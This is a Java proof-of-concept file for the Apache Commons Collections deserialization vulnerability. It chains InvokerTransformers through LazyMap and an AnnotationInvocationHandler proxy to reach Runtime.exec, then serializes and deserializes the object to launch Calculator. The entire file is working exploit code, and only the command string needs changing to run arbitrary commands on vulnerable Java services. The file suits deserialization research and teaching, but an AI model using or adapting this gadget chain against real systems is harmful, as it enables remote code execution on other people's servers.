package cn.rui0.ApacheCommonsCollections;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

/**
 * Created by Ruilin on 2018/7/12.
 */
public class CCPoc {
    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InstantiationException,
            IllegalAccessException, IllegalArgumentException, InvocationTargetException, IOException {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{
                        String.class, Class[].class}, new Object[]{
                        "getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{
                        Object.class, Object[].class}, new Object[]{
                        null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{
                        String.class}, new Object[]{"open /Applications/Calculator.app"})};

        Transformer transformerChain = new ChainedTransformer(transformers);

        Map map = new HashMap();
        Map lazyMap = LazyMap.decorate(map, transformerChain);

        Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
        ctor.setAccessible(true);
        InvocationHandler handlerLazyMap = (InvocationHandler) ctor.newInstance(Retention.class, lazyMap);

        //设置代理
        Class[] interfaces = new Class[]{java.util.Map.class};
        Map proxyMap = (Map) Proxy.newProxyInstance(null, interfaces, handlerLazyMap);
        InvocationHandler handlerProxy = (InvocationHandler) ctor.newInstance(Retention.class, proxyMap);

        System.out.println("Saving serialized object in test.ser");
        FileOutputStream fos = new FileOutputStream("test.ser");
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(handlerProxy);
        oos.flush();


        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("test.ser"));
        Object s = ois.readObject();
        ois.close();
    }

}
